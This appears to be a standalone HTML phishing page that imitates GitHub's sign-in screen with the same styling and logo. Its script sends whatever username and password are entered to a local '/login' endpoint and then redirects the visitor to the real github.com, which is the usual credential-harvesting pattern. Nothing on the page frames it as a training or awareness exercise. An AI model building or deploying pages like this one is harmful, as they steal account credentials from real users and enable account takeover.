<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
            background-color: #0d1117;
            color: #c9d1d9;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 32px;
        }
        .logo {
            margin-bottom: 24px;
        }
        .logo img {
            height: 48px;
            filter: invert(1);
        }
        h1 {
            font-size: 24px;
            font-weight: 300;
            letter-spacing: -0.5px;
            margin-bottom: 16px;
            color: #c9d1d9;
        }
        .container {
            width: 308px;
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 16px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 400;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 5px 12px;
            background-color: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #c9d1d9;
            font-size: 14px;
            line-height: 20px;
            box-sizing: border-box;
            margin-bottom: 16px;
            height: 32px;
        }
        input:focus {
            border-color: #58a6ff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }
        .submit-btn {
            background-color: #238636;
            color: #ffffff;
            border: 1px solid rgba(240, 246, 252, 0.1);
            border-radius: 6px;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            line-height: 20px;
            cursor: pointer;
            width: 100%;
            margin-top: 4px;
        }
        .submit-btn:hover {
            background-color: #2ea043;
            border-color: rgba(240, 246, 252, 0.1);
        }
        .create-account {
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 16px;
            font-size: 14px;
            width: 308px;
            text-align: center;
        }
        .create-account a {
            color: #58a6ff;
            text-decoration: none;
        }
        .create-account a:hover {
            text-decoration: underline;
        }
        .forgot {
            float: right;
            font-size: 12px;
            color: #58a6ff;
            text-decoration: none;
            margin-top: -34px;
            margin-bottom: 8px;
        }
    </style>
    <script>
        async function handleLogin(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    window.location.href = "https://github.com/session";
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</head>
<body>
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/500px-GitHub_Invertocat_Logo.svg.png" alt="GitHub">
    </div>
    <h1>Sign in to GitHub</h1>
    
    <div class="container">
        <form id="login-form" onsubmit="handleLogin(event)">
            <label for="email">Username or email address</label>
            <input type="text" id="email" name="email" required>
            
            <label for="password">Password</label>
            <a href="#" class="forgot">Forgot password?</a>
            <input type="password" id="password" name="password" required>
            
            <button type="submit" class="submit-btn">Sign in</button>
        </form>
    </div>
    
    <div class="create-account">
        New to GitHub? <a href="#">Create an account</a>.
    </div>
</body>
</html>
